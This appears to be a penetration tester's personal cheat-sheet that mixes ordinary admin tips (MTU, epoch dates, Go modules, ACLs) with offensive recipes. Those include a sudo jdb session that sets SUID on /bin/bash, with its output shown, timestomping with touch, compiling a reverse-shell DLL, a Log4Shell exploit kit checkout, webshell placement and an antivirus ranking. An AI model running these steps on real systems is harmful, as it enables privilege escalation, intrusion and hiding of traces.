# java serialization payload `rO0` base64 `AC ED 00 05` in hex
"rO0" Base64
"AC ED 00 05" in Hex

# python pickle serialization magic bytes header signature `80 03` `80 04` `80 05` `(dp0` base64 `gASV` `gAWV`
python2 pickles start like `(dp0` and end with `.`
python2 pickles start with hex `80 03` and end with `.`
`\x80\x02`
>-1 byte 0x2e Python pickle data, protocol version 2
`\x80\x03`
>-1 byte 0x2e Python pickle data, protocol version 3
`\x80\x04\x95`
>-1 byte 0x2e Python pickle data, protocol version 4
`\x80\x05\x95`
>-1 byte 0x2e Python pickle data, protocol version 5

# blank LM hash hex `AAD3B`
blank LM hash. NTLM has hash of password; LM is obsolete and left blank.
` aad3b435b51404eeaad3b435b51404ee `

# default openssl message digest
sha256

# log4j log4shell
the latest version of pimps/JNDI-Exploit-Kit is broken, go back to old versions
```bash
git clone https://github.com/pimps/JNDI-Exploit-Kit
git checkout 0b6925d80d453146db917616c521e7fc8419dbf7
```

# identifying type of encryption of unknown ciphertext
the length of ciphertext encrypted with block mode is usually divisible by some power of 2.
if you can roughly guess the size of the input text, you can try all the ciphers until you find one that produces the correct length of output ciphertext.
try oracle padding to brute force one byte at a time for block cipher encrypted cookies
try hash length extension

# problems/issues connecting through multiple VPNs tunnels MTU
try lowering MTU of the actual interface to accomodate packets with all the extra overhead of multiple VPN routing protocols
```bash
ifconfig tun0 MTU 1000
```

# compile windows c++ binaries on linux
```bash
sudo apt install mingw-w64
# build 32 bit windows DLL on linux and link winsock
x86_64-w64-mingw32-g++ rev.c -o rev.dll -lws2_32 -shared
```

# bloodhound sharphound fix import errors - incompatible versions
new version of bloodhound has to work with new version of sharphound (4).
ensure version of bloodhound is compatible with ingester.

# top tier endpoint protection AV defender
# Microsoft Defender for Endpoint - enterprise protection
# vmware carbon black cloud
# crowdstrike falcon
top tier endpoint protection AV

# cyber reason
B tier of AV

# arctic wolf
# mcaffee
# symantec
# sophos
# malwarebytes
worst tier of AV

# fastapi uvicorn put python webshells
# python uvicorn `--reload` flag
the `--reload` flag for uvicorn means python files can be updated and the server will reload the python

# default http config locations

## FreeBSD
/usr/local/etc/apache22/httpd.conf

# SMB
## fix `NT_STATUS_CONNECTION_DISCONNECTED` errors
To fix NT_STATUS_CONNECTION_DISCONNECTED errors in new Kali installations add client min protocol = NT1 to your \etc\samba\smb.conf file.

# burpsuite

## set scope to limit request catching
> "Target" panel
> "Scope" sub-panel
> add URL

## add header to forwarded requests, like X-Forwarded-For
- go to proxy tab -> options tab -> match and replace: click add
- add header in "Replace" field in format `Header: value`
- leave match condition field blank to add header instead of replacing one

# copy docker binary to target
can copy `docker` binary to target, but need to copy `com.docker.cli` as well

# modify date with touch timestomping
## set destination file date the same as source file date
```bash
touch -d "$(date -r $SRC_FILE)" $FILE
```

# convert epoch to human readable bash
```bash
date --date='@2147483647'
```

## signed 32 bit word Y2K
```bash
date --date="@$(( 2 ** 31 ))"
Tue Jan 19 03:14:08 UTC 2038
```

# plus sign in ls output file ACL
plus sign indicates presence of ACL for file
seen on centos / redhat

## reading ACLs
```bash
getfacl $FILE
```

### recursively
```bash
getfacl -R -s .
getfacl -R -s /
```

# fixing golang module errors

## cannot install module
## go get fails
## no required module provides package
try to run commands to init a module.
```bash
go mod init whatever
go run file.go
# still errors, but now suggests "go get" and that will actually work
go get golang.org/x/crypto/pbkdf2
go run file.go
```

# nodejs api controller program default files
index.js             main code
package.json         package versions
package-lock.json    created at runtime
node-modules/        created at runtime

# wireshark TLS1.2 handshake packet
should see diffie-hellman key exchange.
if it is not present, that means key exchange is not in use and it can be decrypted with the server's private key.
it is not possible to disable key exchange in TLS1.3

# build custom java minecraft plugin with maven
```bash
git clone https://github.com/joe-akeem/minecraft-plugin-template
cd minecraft-plugin-template
# edit code, add command exec to file
# /src/main/java/de/joeakeem/spigotmc/plugin/template/commands/EnrichCommand.java
# build
mvn package
# build output jar is in target/
```

# java jdb execute commands
```
stop on Main.main
run
eval java.lang.Runtime.getRuntime().exec("chmod 6755 /bin/bash");
cont
```
```
user@hostname:~$ sudo /usr/bin/jdb -classpath /root/ Main
Initializing jdb ...
> stop on Main.main
Deferring breakpoint Main.main.
It will be set after the class is loaded.
> run
run Main
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
>
VM Started: Set deferred breakpoint Main.main

Breakpoint hit: "thread=main", Main.main(), line=5 bci=0
5               System.out.println("Hello World!");

main[1] eval java.lang.Runtime.getRuntime().exec("chmod 6755 /bin/bash");
 java.lang.Runtime.getRuntime().exec("chmod 6755 /bin/bash"); = "Process[pid=3332, exitValue="not exited"]"
main[1] cont
> Hello World!

The application exited
```

# apache 2fa default key
https://github.com/itemir/apache_2fa
has default google authenticator key in setup instructions

# Potentially risky HTTP methods: TRACE
if the request is going through a http load balancing proxy,
then we can use TRACE to echo back any extra headers it appends
